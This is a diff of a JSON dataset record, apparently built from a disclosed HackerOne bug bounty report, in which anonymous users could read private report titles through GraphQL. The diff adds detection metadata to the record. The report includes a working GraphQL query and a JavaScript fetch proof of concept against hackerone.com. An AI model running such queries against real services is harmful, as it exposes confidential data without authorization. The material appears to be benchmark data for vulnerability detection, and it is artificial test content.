@@ -1,48 +1,48 @@
 {
-    "reported_to": "HackerOne",
-    "reported_by": "ahacker1 ",
-    "title": "View Titles of Private Reports with pending email invitation",
-    "content": "\nSummary:\nIf a private report has a pending email invitation for collaboration, an anonymous user can see the title of the report.\nThis only works for anonymous users, and the collaboration invitation must be through Manage Collaborators invitation panel.\nDescription:\nSteps To Reproduce\nAs victim:\nIn a report to a bug bounty program, add a collaborator, using any email, such as: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nSave the integer ID of the report.\nIn a new, anonymous/unauthenticated/logged-out session:\nSend GraphQL request, replacing PRIVATE_REPORT_ID integer:\nCode 50 Bytes\n1{\n2  report(id:IPRIVATE_REPORT_ID){\n3    title\n4  }\n5}\nOR run JS implementation:\nBy visiting hackerone.com/hacktivity as anonymous:\nCode 669 Bytes\n1const csrf_token = document.getElementsByName(\"csrf-token\")[0].getAttribute(\"content\")\n2const REPORT_ID = PRIVATE_REPORT_ID // integer\n3\n4var resp = await(await fetch(\"https://hackerone.com/graphql\", {\n5  \"headers\": {\n6    \"accept\": \"*/*\",\n7    \"content-type\": \"application/json\",\n8    \"x-csrf-token\": csrf_token,\n9  },\n10  \"body\": JSON.stringify({\n11    \"operationName\": \"HacktivitySearchQuery\",\n12    \"variables\": {\n13        \"reportId\": REPORT_ID\n14    },\n15    \"query\": `query HacktivitySearchQuery($reportId: Int!) {\n16  report(id: $reportId){\n17    id\n18    url\n19    title\n20  }\n21}\n22`\n23}),\n24  \"method\": \"POST\",\n25  \"mode\": \"cors\",\n26  \"credentials\": \"include\"\n27})).json()\n28console.log(resp.data.report)\nThe title of the report is the response, confirming the vulnerability.\nImpact\nCan read titles of possibly unfixed reports. This can be leveraged against the program, depending on the specificity of the title in the report.\n\n",
-    "severity": [
-        7.7,
-        null
+  "reported_to": "HackerOne",
+  "reported_by": "ahacker1 ",
+  "title": "View Titles of Private Reports with pending email invitation",
+  "content": "\nSummary:\nIf a private report has a pending email invitation for collaboration, an anonymous user can see the title of the report.\nThis only works for anonymous users, and the collaboration invitation must be through Manage Collaborators invitation panel.\nDescription:\nSteps To Reproduce\nAs victim:\nIn a report to a bug bounty program, add a collaborator, using any email, such as: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nSave the integer ID of the report.\nIn a new, anonymous/unauthenticated/logged-out session:\nSend GraphQL request, replacing PRIVATE_REPORT_ID integer:\nCode 50 Bytes\n1{\n2  report(id:IPRIVATE_REPORT_ID){\n3    title\n4  }\n5}\nOR run JS implementation:\nBy visiting hackerone.com/hacktivity as anonymous:\nCode 669 Bytes\n1const csrf_token = document.getElementsByName(\"csrf-token\")[0].getAttribute(\"content\")\n2const REPORT_ID = PRIVATE_REPORT_ID // integer\n3\n4var resp = await(await fetch(\"https://hackerone.com/graphql\", {\n5  \"headers\": {\n6    \"accept\": \"*/*\",\n7    \"content-type\": \"application/json\",\n8    \"x-csrf-token\": csrf_token,\n9  },\n10  \"body\": JSON.stringify({\n11    \"operationName\": \"HacktivitySearchQuery\",\n12    \"variables\": {\n13        \"reportId\": REPORT_ID\n14    },\n15    \"query\": `query HacktivitySearchQuery($reportId: Int!) {\n16  report(id: $reportId){\n17    id\n18    url\n19    title\n20  }\n21}\n22`\n23}),\n24  \"method\": \"POST\",\n25  \"mode\": \"cors\",\n26  \"credentials\": \"include\"\n27})).json()\n28console.log(resp.data.report)\nThe title of the report is the response, confirming the vulnerability.\nImpact\nCan read titles of possibly unfixed reports. This can be leveraged against the program, depending on the specificity of the title in the report.\n\n",
+  "severity": [
+    7.7,
+    null
+  ],
+  "bounty": 5050,
+  "weaknesses": [
+    "Improper Access Control - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1705414620,
+  "report_url": "https://hackerone.com/reports/2312029",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "HIGH",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "As a victim, add a collaborator to a private report using any email via the Manage Collaborators invitation panel and save the report ID."
     ],
-    "bounty": 5050,
-    "weaknesses": [
-        "Improper Access Control - Generic"
-    ],
-    "screenshots": {},
-    "disclosed_date": 1705414620,
-    "report_url": "https://hackerone.com/reports/2312029",
-    "is_multi_component": true,
-    "complexity": "MEDIUM",
-    "novelty": "HIGH",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "As a victim, add a collaborator to a private report using any email via the Manage Collaborators invitation panel and save the report ID."
-        ],
-        [
-            2,
-            "As an anonymous user, send a GraphQL request with the saved report ID to retrieve the title of the private report."
-        ]
-    ],
-    "vuln_description": "An anonymous user can view the title of a private report if it has a pending email invitation for collaboration. This information disclosure vulnerability occurs only when the collaboration invitation is pending and the user is unauthenticated.",
-    "reason": "The vulnerability involves understanding the interaction between pending collaboration invitations and GraphQL access controls. While the steps are straightforward, the requirement for a pending invitation adds a specific condition that must be met for the vulnerability to be exploitable.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "idor_detectable": true,
-    "authnz_byppass_detectable": true,
-    "is_simple_payload": false,
-    "injection_metadata": {
-        "is_simple_payload": false
-    },
-    "authnz_metadata": {
-        "idor_detectable": false,
-        "authnz_byppass_detectable": true
-    }
+    [
+      2,
+      "As an anonymous user, send a GraphQL request with the saved report ID to retrieve the title of the private report."
+    ]
+  ],
+  "vuln_description": "An anonymous user can view the title of a private report if it has a pending email invitation for collaboration. This information disclosure vulnerability occurs only when the collaboration invitation is pending and the user is unauthenticated.",
+  "reason": "The vulnerability involves understanding the interaction between pending collaboration invitations and GraphQL access controls. While the steps are straightforward, the requirement for a pending invitation adds a specific condition that must be met for the vulnerability to be exploitable.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "idor_detectable": true,
+  "authnz_byppass_detectable": true,
+  "is_simple_payload": false,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an unauthenticated user accessing a private report's title by knowing its ID, which fits the methodology's test d) (executing actions with unauthenticated user sessions). The methodology would detect this by observing that an action (querying the report title) that should require authentication can be performed without it.",
+    "is_detectable": true
+  }
 }
